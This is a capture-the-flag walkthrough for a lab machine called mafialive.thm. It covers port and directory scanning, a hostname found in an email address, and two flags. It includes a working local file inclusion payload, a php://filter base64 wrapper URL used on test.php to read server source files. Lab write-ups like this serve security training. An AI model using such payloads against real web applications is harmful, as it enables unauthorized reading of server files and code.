<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A -T4 -p- -v

```
```
We have 2 ports opened. Open the web page (running on port 80) on any browser of your choice

![image](https://user-images.githubusercontent.com/67879936/222671044-e6c67ffa-2728-4bad-90c0-66d14c6fd72e.png)

Answering the Questions that were asked

_#Getting a shell_

1. Looking at the support email address (support@mafialive.thm), you will observe that it clearly shows another hostname. So, all we need is to add the hostname to our /etc/hosts file alongside the IP address of the machine.

command used: ```nano /etc/hosts```

I guess this answered our first question.


2. Find Flag 1

Going over to the domain name we added to our /etc/hosts file, that got our first flag.

![image](https://user-images.githubusercontent.com/67879936/222671788-cc86e35f-4408-4f1e-aa5d-24ec757f027f.png)

flag: ``` thm{f0und_th3_r1ght_h0st_n4m3} ```


3. Look for a page under development
To answer this question all you have to do is run gobuster
>command used: gobuster dir -u mafialive.thm -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ gobuster dir -u mafialive.thm -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 16
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
2023/03/03 09:37:04 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
Progress: 23050 / 23075 (99.89%)
===============================================================
2023/03/03 09:42:34 Finished
===============================================================
```
The scan above reveals robots.txt and /test.php. And Robots.txt disallows test.php.

Going over to /test.php

![image](https://user-images.githubusercontent.com/67879936/222672372-7b9bfeb4-ec49-493a-a3ac-5167abf0d7c7.png)

Clicking on the button reveals that test.php is under development

![image](https://user-images.githubusercontent.com/67879936/222672470-3a52bd03-bf7a-41cd-ade3-912715640e66.png)

I guess this answers our third question



4. Find flag 2

The button on the test.php page is revealing this url

http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php

With this url displayed I think we got oursleves an LFI(Local File Inclusion)

To be able to read the source code we can use a PHP wrapper filter. In this case we will use the one that encodes the content in base64

If you want to read more on PHP wrapper filter you can use this link: [PayloadsAllTheThings — Wrapper php://filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)

Here is how we can actually use it for our host

command url: http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php

Now, using the PHP wrapper filter that encodes content in base64

![image](https://user-images.githubusercontent.com/67879936/222673029-4588c9ae-66c2-4dcc-8050-efb8646b623d.png)

We got a base64 encoded text, we can go ahead to decode it to confirm if it is still the same page

![image](https://user-images.githubusercontent.com/67879936/222673213-554175cb-8a9a-4c8c-8135-9f15f58869cc.png)

>command: echo “PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==” | base64 — decode

Now, lets try this on /test.php (the one we tried earlier was on mrrobot.php)

url: http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

![image](https://user-images.githubusercontent.com/67879936/222673661-fbea35e1-6564-4b18-9c07-7519e6b95b4c.png)

Well, we got ourselves another base64 encoded text. Let’s try decoding this

>command: echo “base64” | base64 — decode

Decoding the text we found this



Flag2:```thm{explo1t1ng_lf1}```























